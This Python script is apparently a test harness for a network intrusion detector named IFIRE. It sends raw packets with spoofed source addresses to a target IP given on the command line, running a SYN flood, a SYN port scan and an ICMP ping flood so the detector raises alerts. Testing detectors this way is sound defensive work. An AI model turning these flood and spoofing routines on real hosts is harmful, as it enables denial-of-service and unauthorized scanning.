#!/usr/bin/env python3
"""
IFIRE Flood Tester
Forces packets through eth0 via SO_BINDTODEVICE so IFIRE captures them.
Usage: sudo python3 flood_test.py [target_ip] [interface]
"""

import socket
import struct
import random
import time
import sys
import os
import threading
import subprocess

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.17.211"
IFACE  = sys.argv[2] if len(sys.argv) > 2 else "eth0"

SO_BINDTODEVICE = 25   # Linux constant

# ── packet builders ────────────────────────────────────────────────────────────

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += data[i] + (data[i+1] << 8)
    if n:
        s += data[-1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def make_ip(src, dst, proto, payload):
    ihl = 5; ver = 4; tos = 0
    tot = 20 + len(payload)
    fid = random.randint(0, 65535)
    ttl = 64; csum = 0
    s = socket.inet_aton(src); d = socket.inet_aton(dst)
    hdr = struct.pack("!BBHHHBBH4s4s", (ver<<4)|ihl, tos, tot, fid, 0, ttl, proto, csum, s, d)
    csum = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", (ver<<4)|ihl, tos, tot, fid, 0, ttl, proto, csum, s, d)

def make_syn(src_ip, dst_ip, sport, dport):
    seq = random.randint(0, 0xFFFFFFFF)
    seg = struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, 0, 0)
    pseudo = struct.pack("!4s4sBBH", socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, len(seg))
    csum = checksum(pseudo + seg)
    return struct.pack("!HHIIBBHHH", sport, dport, seq, 0, 0x50, 0x02, 65535, csum, 0)

def make_icmp(size=1200):
    ident = random.randint(0, 65535)
    seq   = random.randint(0, 65535)
    hdr   = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
    pay   = b'A' * size
    csum  = checksum(hdr + pay)
    return struct.pack("!BBHHH", 8, 0, csum, ident, seq) + pay

def raw_sock():
    """Raw socket bound to IFACE so packets appear on that interface."""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    # Force packets through IFACE regardless of routing table
    s.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE,
                 IFACE.encode() + b'\x00')
    return s

def rand_ip():
    return f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

# ── attacks ────────────────────────────────────────────────────────────────────

def syn_flood():
    print(f"[SYN FLOOD]  → {TARGET}  500 SYNs to port 80 from one spoofed IP")
    s   = raw_sock()
    src = rand_ip()
    sp  = random.randint(1024, 65535)
    for _ in range(500):
        tcp = make_syn(src, TARGET, sp, 80)
        ip  = make_ip(src, TARGET, 6, tcp)
        s.sendto(ip + tcp, (TARGET, 0))
    s.close()
    print(f"    done  src={src}")

def port_scan():
    print(f"[PORT SCAN]  → {TARGET}  SYN to 25 unique ports from one spoofed IP")
    s    = raw_sock()
    src  = rand_ip()
    sp   = random.randint(1024, 65535)
    ports = random.sample(range(1, 65535), 25)
    for dp in ports:
        tcp = make_syn(src, TARGET, sp, dp)
        ip  = make_ip(src, TARGET, 6, tcp)
        s.sendto(ip + tcp, (TARGET, 0))
        time.sleep(0.05)
    s.close()
    print(f"    done  src={src}")

def ping_flood():
    print(f"[PING FLOOD] → {TARGET}  120 × 1200-byte ICMP from one spoofed IP")
    s   = raw_sock()
    src = rand_ip()
    pkt = make_icmp(1200)
    ip  = make_ip(src, TARGET, 1, pkt)
    for _ in range(120):
        s.sendto(ip + pkt, (TARGET, 0))
        time.sleep(0.04)
    s.close()
    print(f"    done  src={src}")

# ── main ───────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root:  sudo python3 flood_test.py [target_ip] [interface]")
        sys.exit(1)

    print(f"\n  IFIRE Flood Tester")
    print(f"  target   : {TARGET}")
    print(f"  interface: {IFACE}  (packets forced through this device)")
    print(f"  Make sure IFIRE is running:  sudo ./ifire -d {IFACE} -q\n")

    for i in range(3, 0, -1):
        print(f"  Starting in {i}...", end="\r", flush=True)
        time.sleep(1)
    print("  Launching attacks now!       ")
    print()

    threads = [
        threading.Thread(target=syn_flood,  name="syn"),
        threading.Thread(target=port_scan,  name="scan"),
        threading.Thread(target=ping_flood, name="ping"),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print("\n  Done. IFIRE should show PORT_SCAN, SYN_FLOOD, and PING_FLOOD alerts.")
